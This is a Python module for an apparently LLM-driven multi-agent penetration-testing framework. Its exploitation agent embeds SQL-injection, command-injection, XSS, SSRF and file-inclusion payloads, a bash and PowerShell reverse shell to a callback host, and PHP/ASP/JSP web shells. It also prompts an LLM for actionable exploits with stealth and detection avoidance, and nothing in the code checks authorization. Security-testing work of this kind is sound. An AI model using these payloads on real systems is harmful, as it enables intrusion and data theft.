"""
Delegation System - Specialized AI Agents for Different Tasks

This module implements a multi-agent architecture where specialized agents
handle different aspects of penetration testing:

1. Research Agent - Gathers intelligence, researches vulnerabilities
2. Exploitation Agent - Plans and executes exploitation strategies
3. Recon Agent - Handles reconnaissance and enumeration
4. Analysis Agent - Analyzes results and identifies patterns
5. Reporting Agent - Generates reports and explanations

Each agent can work independently or collaborate on complex tasks.
"""

import os
import json
import logging
import asyncio
from abc import ABC, abstractmethod
from datetime import datetime
from typing import Dict, List, Any, Optional, Callable
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor
import threading
from queue import Queue, Empty

logger = logging.getLogger(__name__)


class AgentType(Enum):
    """Types of specialized agents"""
    RESEARCH = "research"
    EXPLOITATION = "exploitation"
    RECON = "recon"
    ANALYSIS = "analysis"
    REPORTING = "reporting"
    COORDINATOR = "coordinator"


class TaskPriority(Enum):
    """Task priority levels"""
    CRITICAL = 1
    HIGH = 2
    MEDIUM = 3
    LOW = 4


class TaskStatus(Enum):
    """Task execution status"""
    PENDING = "pending"
    IN_PROGRESS = "in_progress"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"


@dataclass
class AgentTask:
    """A task to be executed by an agent"""
    id: str
    task_type: str
    description: str
    priority: TaskPriority
    payload: Dict[str, Any]
    assigned_agent: Optional[AgentType] = None
    status: TaskStatus = TaskStatus.PENDING
    result: Optional[Dict[str, Any]] = None
    error: Optional[str] = None
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    started_at: Optional[str] = None
    completed_at: Optional[str] = None
    dependencies: List[str] = field(default_factory=list)  # Task IDs this depends on
    parent_task_id: Optional[str] = None


@dataclass
class AgentMessage:
    """Message passed between agents"""
    from_agent: AgentType
    to_agent: AgentType
    message_type: str  # 'request', 'response', 'broadcast', 'handoff'
    content: Dict[str, Any]
    correlation_id: str  # Links related messages
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


class BaseAgent(ABC):
    """Base class for all specialized agents"""
    
    def __init__(self, agent_type: AgentType, llm_client=None):
        self.agent_type = agent_type
        self.llm_client = llm_client
        self.is_running = False
        self.task_queue = Queue()
        self.message_inbox = Queue()
        self.capabilities = []
        self._worker_thread = None
        
        # Agent state
        self.current_task: Optional[AgentTask] = None
        self.completed_tasks: List[str] = []
        self.knowledge_base: Dict[str, Any] = {}
        
        logger.info(f"Initialized {agent_type.value} agent")
    
    @abstractmethod
    def get_capabilities(self) -> List[str]:
        """Return list of capabilities this agent has"""
        pass
    
    @abstractmethod
    async def execute_task(self, task: AgentTask) -> Dict[str, Any]:
        """Execute a task and return results"""
        pass
    
    @abstractmethod
    def can_handle_task(self, task: AgentTask) -> bool:
        """Check if this agent can handle a given task"""
        pass
    
    def start(self):
        """Start the agent's worker thread"""
        self.is_running = True
        self._worker_thread = threading.Thread(target=self._worker_loop)
        self._worker_thread.daemon = True
        self._worker_thread.start()
        logger.info(f"{self.agent_type.value} agent started")
    
    def stop(self):
        """Stop the agent"""
        self.is_running = False
        if self._worker_thread:
            self._worker_thread.join(timeout=5)
        logger.info(f"{self.agent_type.value} agent stopped")
    
    def _worker_loop(self):
        """Main worker loop"""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        while self.is_running:
            try:
                # Check for tasks
                try:
                    task = self.task_queue.get(timeout=1)
                    self.current_task = task
                    task.status = TaskStatus.IN_PROGRESS
                    task.started_at = datetime.now().isoformat()
                    
                    try:
                        result = loop.run_until_complete(self.execute_task(task))
                        task.status = TaskStatus.COMPLETED
                        task.result = result
                    except Exception as e:
                        task.status = TaskStatus.FAILED
                        task.error = str(e)
                        logger.error(f"Task {task.id} failed: {e}")
                    
                    task.completed_at = datetime.now().isoformat()
                    self.completed_tasks.append(task.id)
                    self.current_task = None
                    
                except Empty:
                    pass
                
                # Check for messages
                try:
                    message = self.message_inbox.get_nowait()
                    self._handle_message(message)
                except Empty:
                    pass
                    
            except Exception as e:
                logger.error(f"Error in {self.agent_type.value} worker: {e}")
        
        loop.close()
    
    def _handle_message(self, message: AgentMessage):
        """Handle incoming message from another agent"""
        logger.debug(f"{self.agent_type.value} received message from {message.from_agent.value}")
        # Override in subclasses for custom message handling
    
    def send_message(self, to_agent: 'BaseAgent', message_type: str, 
                    content: Dict[str, Any], correlation_id: str):
        """Send a message to another agent"""
        message = AgentMessage(
            from_agent=self.agent_type,
            to_agent=to_agent.agent_type,
            message_type=message_type,
            content=content,
            correlation_id=correlation_id
        )
        to_agent.message_inbox.put(message)
    
    async def consult_llm(self, prompt: str, system_prompt: str = None) -> str:
        """Consult the LLM for reasoning/decision making"""
        if not self.llm_client:
            logger.warning("No LLM client configured")
            return ""
        
        try:
            # This would call your LLM API (Claude, GPT-4, etc.)
            response = await self.llm_client.complete(
                prompt=prompt,
                system_prompt=system_prompt or self._get_system_prompt()
            )
            return response
        except Exception as e:
            logger.error(f"LLM consultation failed: {e}")
            return ""
    
    def _get_system_prompt(self) -> str:
        """Get the system prompt for this agent type"""
        return f"You are a specialized {self.agent_type.value} agent for penetration testing."


class ResearchAgent(BaseAgent):
    """
    Research Agent - Specializes in gathering intelligence
    
    Capabilities:
    - CVE research
    - Exploit hunting
    - Technology fingerprinting
    - Attack surface mapping
    - Vulnerability correlation
    """
    
    def __init__(self, llm_client=None):
        super().__init__(AgentType.RESEARCH, llm_client)
        
        # Import dependencies
        try:
            from .web_intelligence import get_web_intelligence
            self.web_intel = get_web_intelligence()
        except ImportError:
            self.web_intel = None
            logger.warning("Web intelligence not available")
    
    def get_capabilities(self) -> List[str]:
        return [
            "cve_research",
            "exploit_search",
            "technology_research",
            "vulnerability_correlation",
            "attack_surface_mapping",
            "threat_intelligence"
        ]
    
    def can_handle_task(self, task: AgentTask) -> bool:
        research_tasks = [
            "research_vulnerability",
            "find_exploits",
            "research_technology",
            "gather_intelligence",
            "correlate_vulnerabilities"
        ]
        return task.task_type in research_tasks
    
    async def execute_task(self, task: AgentTask) -> Dict[str, Any]:
        """Execute a research task"""
        logger.info(f"Research agent executing: {task.task_type}")
        
        if task.task_type == "research_vulnerability":
            return await self._research_vulnerability(task.payload)
        elif task.task_type == "find_exploits":
            return await self._find_exploits(task.payload)
        elif task.task_type == "research_technology":
            return await self._research_technology(task.payload)
        elif task.task_type == "gather_intelligence":
            return await self._gather_intelligence(task.payload)
        else:
            raise ValueError(f"Unknown task type: {task.task_type}")
    
    async def _research_vulnerability(self, payload: Dict) -> Dict:
        """Research a specific vulnerability"""
        vuln_id = payload.get('vulnerability_id', '')
        keyword = payload.get('keyword', '')
        
        results = {
            'cve_details': None,
            'exploits': [],
            'references': [],
            'recommendations': []
        }
        
        if self.web_intel:
            if vuln_id.startswith('CVE-'):
                results['cve_details'] = self.web_intel.get_exploit_info(vuln_id)
            elif keyword:
                cves = self.web_intel.search_vulnerability(keyword)
                results['related_cves'] = cves
        
        # Use LLM to analyze and provide recommendations
        if results['cve_details'] and self.llm_client:
            analysis_prompt = f"""
            Analyze this vulnerability and provide exploitation recommendations:
            
            CVE Details: {json.dumps(results['cve_details'], indent=2)}
            
            Provide:
            1. Risk assessment
            2. Exploitation difficulty
            3. Recommended exploitation approach
            4. Mitigation recommendations
            """
            
            llm_response = await self.consult_llm(analysis_prompt)
            results['llm_analysis'] = llm_response
        
        return results
    
    async def _find_exploits(self, payload: Dict) -> Dict:
        """Find exploits for given vulnerabilities"""
        cve_ids = payload.get('cve_ids', [])
        technology = payload.get('technology', '')
        
        exploits = []
        
        if self.web_intel:
            for cve_id in cve_ids:
                info = self.web_intel.get_exploit_info(cve_id)
                if info.get('known_exploits'):
                    exploits.extend(info['known_exploits'])
        
        return {
            'exploits_found': len(exploits),
            'exploits': exploits
        }
    
    async def _research_technology(self, payload: Dict) -> Dict:
        """Research a specific technology for vulnerabilities"""
        technology = payload.get('technology', '')
        version = payload.get('version', '')
        
        if self.web_intel:
            return self.web_intel.get_technology_intel(technology, version)
        
        return {'technology': technology, 'no_intel_available': True}
    
    async def _gather_intelligence(self, payload: Dict) -> Dict:
        """Gather comprehensive intelligence on a target"""
        target = payload.get('target', '')
        
        if self.web_intel:
            return self.web_intel.gather_target_intelligence(target)
        
        return {'target': target, 'no_intel_available': True}
    
    def _get_system_prompt(self) -> str:
        return """You are an expert security researcher specializing in vulnerability research 
        and exploit analysis. Your role is to:
        1. Research CVEs and understand their technical details
        2. Find and evaluate public exploits
        3. Assess exploitation difficulty and requirements
        4. Provide actionable intelligence for penetration testing
        
        Always be thorough and accurate in your analysis."""


class ExploitationAgent(BaseAgent):
    """
    Exploitation Agent - Specializes in exploit execution and payload generation
    
    Capabilities:
    - Exploit selection
    - Payload generation
    - Post-exploitation planning
    - Privilege escalation
    - Lateral movement planning
    """
    
    def __init__(self, llm_client=None):
        super().__init__(AgentType.EXPLOITATION, llm_client)
        
        # Exploit templates
        self.exploit_templates = self._load_exploit_templates()
    
    def _load_exploit_templates(self) -> Dict:
        """Load exploit templates"""
        return {
            'sql_injection': {
                'tools': ['sqlmap'],
                'payloads': ["' OR '1'='1", "1; DROP TABLE users--"],
                'verification': 'Extract data or cause error'
            },
            'command_injection': {
                'tools': ['commix'],
                'payloads': ['; id', '| cat /etc/passwd', '`whoami`'],
                'verification': 'Command output in response'
            },
            'xss': {
                'tools': ['xsstrike', 'dalfox'],
                'payloads': ['<script>alert(1)</script>', '<img onerror=alert(1) src=x>'],
                'verification': 'Script execution or DOM modification'
            },
            'ssrf': {
                'tools': ['nuclei'],
                'payloads': ['http://169.254.169.254/latest/meta-data/', 'http://localhost:6379/'],
                'verification': 'Internal resource access'
            },
            'lfi': {
                'tools': ['nuclei', 'ffuf'],
                'payloads': ['../../../etc/passwd', '....//....//....//etc/passwd'],
                'verification': 'File contents in response'
            }
        }
    
    def get_capabilities(self) -> List[str]:
        return [
            "exploit_selection",
            "payload_generation",
            "exploit_execution",
            "post_exploitation",
            "privilege_escalation",
            "lateral_movement"
        ]
    
    def can_handle_task(self, task: AgentTask) -> bool:
        exploitation_tasks = [
            "generate_exploit",
            "select_exploit",
            "plan_exploitation",
            "generate_payload",
            "plan_post_exploitation"
        ]
        return task.task_type in exploitation_tasks
    
    async def execute_task(self, task: AgentTask) -> Dict[str, Any]:
        """Execute an exploitation task"""
        logger.info(f"Exploitation agent executing: {task.task_type}")
        
        if task.task_type == "generate_exploit":
            return await self._generate_exploit(task.payload)
        elif task.task_type == "select_exploit":
            return await self._select_exploit(task.payload)
        elif task.task_type == "plan_exploitation":
            return await self._plan_exploitation(task.payload)
        elif task.task_type == "generate_payload":
            return await self._generate_payload(task.payload)
        else:
            raise ValueError(f"Unknown task type: {task.task_type}")
    
    async def _generate_exploit(self, payload: Dict) -> Dict:
        """Generate an exploit for a vulnerability"""
        vuln_type = payload.get('vulnerability_type', '')
        target = payload.get('target', '')
        context = payload.get('context', {})
        
        result = {
            'vulnerability_type': vuln_type,
            'target': target,
            'exploit_code': None,
            'tool_commands': [],
            'manual_steps': []
        }
        
        # Get template if available
        if vuln_type.lower().replace(' ', '_') in self.exploit_templates:
            template = self.exploit_templates[vuln_type.lower().replace(' ', '_')]
            result['tools'] = template['tools']
            result['payloads'] = template['payloads']
        
        # Use LLM to generate custom exploit
        if self.llm_client:
            exploit_prompt = f"""
            Generate an exploitation approach for:
            
            Vulnerability Type: {vuln_type}
            Target: {target}
            Context: {json.dumps(context, indent=2)}
            
            Provide:
            1. Specific tool commands to use
            2. Custom payloads if needed
            3. Step-by-step exploitation process
            4. Expected outcomes
            5. Verification methods
            
            Be specific and actionable.
            """
            
            llm_response = await self.consult_llm(exploit_prompt)
            result['llm_exploit_plan'] = llm_response
        
        return result
    
    async def _select_exploit(self, payload: Dict) -> Dict:
        """Select the best exploit for given vulnerabilities"""
        vulnerabilities = payload.get('vulnerabilities', [])
        target_context = payload.get('context', {})
        
        selected = []
        
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', '').lower().replace(' ', '_')
            
            if vuln_type in self.exploit_templates:
                template = self.exploit_templates[vuln_type]
                selected.append({
                    'vulnerability': vuln,
                    'recommended_tools': template['tools'],
                    'sample_payloads': template['payloads'],
                    'priority': self._calculate_exploit_priority(vuln)
                })
        
        # Sort by priority
        selected.sort(key=lambda x: x['priority'], reverse=True)
        
        return {
            'selected_exploits': selected,
            'total_exploitable': len(selected)
        }
    
    def _calculate_exploit_priority(self, vuln: Dict) -> float:
        """Calculate priority score for an exploit"""
        score = 0.0
        
        # CVSS score
        cvss = vuln.get('cvss_score', 0)
        score += cvss * 0.5
        
        # Exploit availability
        if vuln.get('has_public_exploit'):
            score += 2.0
        
        # Impact type
        impact = vuln.get('impact', '').lower()
        if 'rce' in impact or 'remote code' in impact:
            score += 3.0
        elif 'sqli' in impact or 'sql injection' in impact:
            score += 2.5
        elif 'auth bypass' in impact:
            score += 2.0
        
        return score
    
    async def _plan_exploitation(self, payload: Dict) -> Dict:
        """Plan a full exploitation campaign"""
        target = payload.get('target', '')
        vulnerabilities = payload.get('vulnerabilities', [])
        
        # Use LLM for strategic planning
        if self.llm_client:
            plan_prompt = f"""
            Create a detailed exploitation plan for:
            
            Target: {target}
            Vulnerabilities: {json.dumps(vulnerabilities, indent=2)}
            
            Create:
            1. Attack sequence (which vulns to exploit first)
            2. Exploitation dependencies (what needs to succeed first)
            3. Pivot opportunities (how to chain exploits)
            4. Risk assessment for each step
            5. Rollback plan if things go wrong
            """
            
            plan = await self.consult_llm(plan_prompt)
            return {
                'target': target,
                'exploitation_plan': plan,
                'vulnerability_count': len(vulnerabilities)
            }
        
        return {'target': target, 'no_plan_generated': True}
    
    async def _generate_payload(self, payload: Dict) -> Dict:
        """Generate a custom payload"""
        payload_type = payload.get('type', '')
        target_os = payload.get('target_os', 'linux')
        callback_host = payload.get('callback_host', '')
        
        payloads = {
            'reverse_shell': {
                'linux': f"bash -i >& /dev/tcp/{callback_host}/4444 0>&1",
                'windows': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{callback_host}',4444)"
            },
            'web_shell': {
                'php': "<?php system($_GET['cmd']); ?>",
                'asp': "<%eval request('cmd')%>",
                'jsp': "<%Runtime.getRuntime().exec(request.getParameter('cmd'));%>"
            }
        }
        
        result = {
            'payload_type': payload_type,
            'target_os': target_os
        }
        
        if payload_type in payloads:
            if target_os in payloads[payload_type]:
                result['payload'] = payloads[payload_type][target_os]
            else:
                result['available_variants'] = list(payloads[payload_type].keys())
        
        return result
    
    def _get_system_prompt(self) -> str:
        return """You are an expert penetration tester specializing in exploitation.
        Your role is to:
        1. Analyze vulnerabilities and select appropriate exploits
        2. Generate custom payloads and exploitation code
        3. Plan exploitation campaigns strategically
        4. Identify post-exploitation opportunities
        
        Always consider:
        - Stealth and detection avoidance
        - Impact assessment before exploitation
        - Clean rollback procedures
        
        Be precise and professional in your recommendations."""


class ReconAgent(BaseAgent):
    """
    Reconnaissance Agent - Specializes in information gathering
    
    Capabilities:
    - Port scanning coordination
    - Service enumeration
    - Technology detection
    - OSINT gathering
    - Attack surface mapping
    """
    
    def __init__(self, llm_client=None):
        super().__init__(AgentType.RECON, llm_client)
    
    def get_capabilities(self) -> List[str]:
        return [
            "port_scanning",
            "service_enumeration",
            "technology_detection",
            "osint_gathering",
            "subdomain_enumeration",
            "attack_surface_mapping"
        ]
    
    def can_handle_task(self, task: AgentTask) -> bool:
        recon_tasks = [
            "enumerate_target",
            "scan_ports",
            "detect_technologies",
            "map_attack_surface",
            "gather_osint"
        ]
        return task.task_type in recon_tasks
    
    async def execute_task(self, task: AgentTask) -> Dict[str, Any]:
        """Execute a reconnaissance task"""
        logger.info(f"Recon agent executing: {task.task_type}")
        
        if task.task_type == "enumerate_target":
            return await self._enumerate_target(task.payload)
        elif task.task_type == "map_attack_surface":
            return await self._map_attack_surface(task.payload)
        else:
            return {'status': 'not_implemented', 'task': task.task_type}
    
    async def _enumerate_target(self, payload: Dict) -> Dict:
        """Enumerate a target comprehensively"""
        target = payload.get('target', '')
        
        # This would coordinate with the actual scanning tools
        return {
            'target': target,
            'enumeration_plan': {
                'phase_1': 'Port scan (nmap -sV -sC)',
                'phase_2': 'Service enumeration',
                'phase_3': 'Technology fingerprinting',
                'phase_4': 'Directory enumeration'
            }
        }
    
    async def _map_attack_surface(self, payload: Dict) -> Dict:
        """Map the complete attack surface"""
        target = payload.get('target', '')
        scan_results = payload.get('scan_results', {})
        
        attack_surface = {
            'target': target,
            'entry_points': [],
            'services': [],
            'potential_vectors': []
        }
        
        # Analyze scan results to identify attack surface
        # This would be more sophisticated in production
        
        return attack_surface


class AnalysisAgent(BaseAgent):
    """
    Analysis Agent - Specializes in analyzing results and patterns
    
    Capabilities:
    - Vulnerability correlation
    - Pattern recognition
    - Risk assessment
    - Attack path analysis
    - False positive detection
    """
    
    def __init__(self, llm_client=None):
        super().__init__(AgentType.ANALYSIS, llm_client)
    
    def get_capabilities(self) -> List[str]:
        return [
            "vulnerability_correlation",
            "pattern_recognition",
            "risk_assessment",
            "attack_path_analysis",
            "false_positive_detection"
        ]
    
    def can_handle_task(self, task: AgentTask) -> bool:
        analysis_tasks = [
            "analyze_results",
            "correlate_findings",
            "assess_risk",
            "identify_patterns",
            "validate_findings"
        ]
        return task.task_type in analysis_tasks
    
    async def execute_task(self, task: AgentTask) -> Dict[str, Any]:
        """Execute an analysis task"""
        logger.info(f"Analysis agent executing: {task.task_type}")
        
        if task.task_type == "analyze_results":
            return await self._analyze_results(task.payload)
        elif task.task_type == "correlate_findings":
            return await self._correlate_findings(task.payload)
        elif task.task_type == "assess_risk":
            return await self._assess_risk(task.payload)
        else:
            return {'status': 'not_implemented', 'task': task.task_type}
    
    async def _analyze_results(self, payload: Dict) -> Dict:
        """Analyze scan results comprehensively"""
        results = payload.get('results', [])
        
        analysis = {
            'total_findings': len(results),
            'by_severity': {},
            'by_type': {},
            'correlations': [],
            'recommendations': []
        }
        
        # Categorize findings
        for result in results:
            severity = result.get('severity', 'unknown')
            vuln_type = result.get('type', 'unknown')
            
            analysis['by_severity'][severity] = analysis['by_severity'].get(severity, 0) + 1
            analysis['by_type'][vuln_type] = analysis['by_type'].get(vuln_type, 0) + 1
        
        # Use LLM for deeper analysis
        if self.llm_client and results:
            analysis_prompt = f"""
            Analyze these penetration testing findings:
            
            {json.dumps(results[:20], indent=2)}  # Limit for prompt size
            
            Provide:
            1. Key patterns identified
            2. Correlations between findings
            3. Most critical attack paths
            4. Prioritized remediation recommendations
            """
            
            llm_analysis = await self.consult_llm(analysis_prompt)
            analysis['llm_analysis'] = llm_analysis
        
        return analysis
    
    async def _correlate_findings(self, payload: Dict) -> Dict:
        """Correlate findings to identify attack chains"""
        findings = payload.get('findings', [])
        
        # Simple correlation logic
        correlations = []
        
        # Example: SSRF + Internal service = potential chain
        ssrf_findings = [f for f in findings if 'ssrf' in f.get('type', '').lower()]
        internal_services = [f for f in findings if f.get('internal', False)]
        
        if ssrf_findings and internal_services:
            correlations.append({
                'type': 'ssrf_to_internal',
                'description': 'SSRF can be used to access internal services',
                'findings': [ssrf_findings[0], internal_services[0]],
                'severity': 'critical'
            })
        
        return {'correlations': correlations}
    
    async def _assess_risk(self, payload: Dict) -> Dict:
        """Assess overall risk from findings"""
        findings = payload.get('findings', [])
        
        risk_score = 0.0
        risk_factors = []
        
        for finding in findings:
            cvss = finding.get('cvss_score', 0)
            risk_score += cvss
            
            if cvss >= 9.0:
                risk_factors.append(f"Critical: {finding.get('title', 'Unknown')}")
            elif cvss >= 7.0:
                risk_factors.append(f"High: {finding.get('title', 'Unknown')}")
        
        # Normalize score
        max_possible = len(findings) * 10
        normalized_score = (risk_score / max_possible * 100) if max_possible > 0 else 0
        
        return {
            'risk_score': round(normalized_score, 2),
            'risk_level': 'critical' if normalized_score > 75 else 'high' if normalized_score > 50 else 'medium' if normalized_score > 25 else 'low',
            'risk_factors': risk_factors
        }


class ReportingAgent(BaseAgent):
    """
    Reporting Agent - Specializes in generating reports and explanations
    
    Capabilities:
    - Executive summary generation
    - Technical report generation
    - Remediation guidance
    - Compliance mapping
    - Explainable AI output
    """
    
    def __init__(self, llm_client=None):
        super().__init__(AgentType.REPORTING, llm_client)
    
    def get_capabilities(self) -> List[str]:
        return [
            "executive_summary",
            "technical_report",
            "remediation_guidance",
            "compliance_mapping",
            "explain_decisions"
        ]
    
    def can_handle_task(self, task: AgentTask) -> bool:
        reporting_tasks = [
            "generate_report",
            "generate_summary",
            "explain_findings",
            "create_remediation_plan",
            "explain_ai_decisions"
        ]
        return task.task_type in reporting_tasks
    
    async def execute_task(self, task: AgentTask) -> Dict[str, Any]:
        """Execute a reporting task"""
        logger.info(f"Reporting agent executing: {task.task_type}")
        
        if task.task_type == "explain_ai_decisions":
            return await self._explain_decisions(task.payload)
        elif task.task_type == "generate_summary":
            return await self._generate_summary(task.payload)
        else:
            return {'status': 'not_implemented', 'task': task.task_type}
    
    async def _explain_decisions(self, payload: Dict) -> Dict:
        """Generate explainable AI output for decisions made"""
        decisions = payload.get('decisions', [])
        context = payload.get('context', {})
        
        explanations = []
        
        for decision in decisions:
            explanation = {
                'decision': decision.get('action', ''),
                'reasoning': '',
                'factors': [],
                'alternatives_considered': []
            }
            
            if self.llm_client:
                explain_prompt = f"""
                Explain this penetration testing decision in clear, professional language:
                
                Decision: {decision.get('action', '')}
                Context: {json.dumps(decision.get('context', {}), indent=2)}
                Outcome: {decision.get('outcome', '')}
                
                Provide:
                1. Why this action was chosen
                2. What factors influenced the decision
                3. What alternatives were considered
                4. Why this was the best choice
                
                Write for a technical but non-expert audience.
                """
                
                llm_explanation = await self.consult_llm(explain_prompt)
                explanation['reasoning'] = llm_explanation
            
            explanations.append(explanation)
        
        return {'explanations': explanations}
    
    async def _generate_summary(self, payload: Dict) -> Dict:
        """Generate executive summary"""
        findings = payload.get('findings', [])
        scan_metadata = payload.get('metadata', {})
        
        if self.llm_client:
            summary_prompt = f"""
            Generate an executive summary for this penetration test:
            
            Target: {scan_metadata.get('target', 'Unknown')}
            Duration: {scan_metadata.get('duration', 'Unknown')}
            Total Findings: {len(findings)}
            
            Key Findings:
            {json.dumps(findings[:10], indent=2)}
            
            Write a professional executive summary covering:
            1. Overall security posture
            2. Critical risks identified
            3. Key recommendations
            4. Next steps
            
            Keep it concise (2-3 paragraphs).
            """
            
            summary = await self.consult_llm(summary_prompt)
            return {'executive_summary': summary}
        
        return {'executive_summary': 'LLM required for summary generation'}


class AgentCoordinator:
    """
    Coordinator for managing multiple agents
    
    Responsibilities:
    - Task routing to appropriate agents
    - Inter-agent communication
    - Task dependency management
    - Workload balancing
    """
    
    def __init__(self, llm_client=None):
        self.llm_client = llm_client
        self.agents: Dict[AgentType, BaseAgent] = {}
        self.task_registry: Dict[str, AgentTask] = {}
        self.message_bus = Queue()
        
        # Initialize agents
        self._initialize_agents()
    
    def _initialize_agents(self):
        """Initialize all specialized agents"""
        self.agents[AgentType.RESEARCH] = ResearchAgent(self.llm_client)
        self.agents[AgentType.EXPLOITATION] = ExploitationAgent(self.llm_client)
        self.agents[AgentType.RECON] = ReconAgent(self.llm_client)
        self.agents[AgentType.ANALYSIS] = AnalysisAgent(self.llm_client)
        self.agents[AgentType.REPORTING] = ReportingAgent(self.llm_client)
        
        logger.info(f"Initialized {len(self.agents)} specialized agents")
    
    def start_all_agents(self):
        """Start all agents"""
        for agent in self.agents.values():
            agent.start()
    
    def stop_all_agents(self):
        """Stop all agents"""
        for agent in self.agents.values():
            agent.stop()
    
    def submit_task(self, task: AgentTask) -> str:
        """Submit a task for execution"""
        # Find appropriate agent
        assigned_agent = self._route_task(task)
        
        if assigned_agent:
            task.assigned_agent = assigned_agent.agent_type
            self.task_registry[task.id] = task
            assigned_agent.task_queue.put(task)
            logger.info(f"Task {task.id} assigned to {assigned_agent.agent_type.value}")
            return task.id
        else:
            task.status = TaskStatus.FAILED
            task.error = "No suitable agent found"
            logger.warning(f"No agent found for task: {task.task_type}")
            return task.id
    
    def _route_task(self, task: AgentTask) -> Optional[BaseAgent]:
        """Route task to the most appropriate agent"""
        for agent in self.agents.values():
            if agent.can_handle_task(task):
                return agent
        return None
    
    def get_task_status(self, task_id: str) -> Optional[AgentTask]:
        """Get the status of a task"""
        return self.task_registry.get(task_id)
    
    def delegate_complex_task(self, description: str, context: Dict) -> List[str]:
        """
        Break down a complex task into subtasks and delegate to agents
        
        Returns list of task IDs
        """
        task_ids = []
        
        # Use LLM to break down the task (if available)
        if self.llm_client:
            # In production, this would call the LLM to decompose the task
            pass
        
        # Simple rule-based decomposition
        if 'scan' in description.lower() or 'pentest' in description.lower():
            # Create subtasks for a full pentest
            subtasks = [
                AgentTask(
                    id=f"recon_{datetime.now().timestamp()}",
                    task_type="enumerate_target",
                    description="Initial reconnaissance",
                    priority=TaskPriority.HIGH,
                    payload=context
                ),
                AgentTask(
                    id=f"intel_{datetime.now().timestamp()}",
                    task_type="gather_intelligence",
                    description="Gather target intelligence",
                    priority=TaskPriority.HIGH,
                    payload=context
                ),
                AgentTask(
                    id=f"analyze_{datetime.now().timestamp()}",
                    task_type="analyze_results",
                    description="Analyze gathered information",
                    priority=TaskPriority.MEDIUM,
                    payload=context,
                    dependencies=[f"recon_{datetime.now().timestamp()}"]
                )
            ]
            
            for task in subtasks:
                task_ids.append(self.submit_task(task))
        
        return task_ids
    
    def get_agent_status(self) -> Dict[str, Any]:
        """Get status of all agents"""
        return {
            agent_type.value: {
                'is_running': agent.is_running,
                'current_task': agent.current_task.id if agent.current_task else None,
                'completed_tasks': len(agent.completed_tasks),
                'queue_size': agent.task_queue.qsize()
            }
            for agent_type, agent in self.agents.items()
        }


# Singleton instance
_coordinator = None

def get_agent_coordinator(llm_client=None) -> AgentCoordinator:
    """Get the singleton agent coordinator"""
    global _coordinator
    if _coordinator is None:
        _coordinator = AgentCoordinator(llm_client)
    return _coordinator
